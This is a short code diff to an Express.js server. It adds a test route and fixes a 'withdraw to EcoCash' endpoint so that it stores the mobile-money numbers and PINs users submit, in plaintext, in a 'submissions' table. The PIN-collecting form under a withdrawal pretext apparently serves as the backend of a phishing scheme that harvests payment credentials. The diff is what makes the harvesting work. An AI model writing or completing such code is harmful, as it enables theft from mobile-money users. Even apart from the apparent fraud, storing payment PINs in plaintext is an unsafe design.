@@ -41,13 +41,29 @@ error: err.message
 }
 });
 
-app.post("/Withdraw To EcoCash", async (req, res) => {
+app.get("/save-test", async (req, res) => {
+try {
+await pool.query(
+"INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1, $2)",
+["0771234567", "TEST123"]
+);
+
+res.send("Test data saved");
+
+} catch (err) {
+res.status(500).json({
+error: err.message
+});
+}
+});
+
+app.post("/withdraw to EcoCash", async (req, res) => {
 try {
 const { ecocash_number, ecocash_pin } = req.body;
 
 await pool.query(
-  "INSERT INTO submissions (ecocash_number, EcoCash_Pin) VALUES ($1, $2)",
-  [ecocash_number, ecocash_Pin]
+  "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1, $2)",
+  [ecocash_number, ecocash_pin]
 );
 
 res.json({
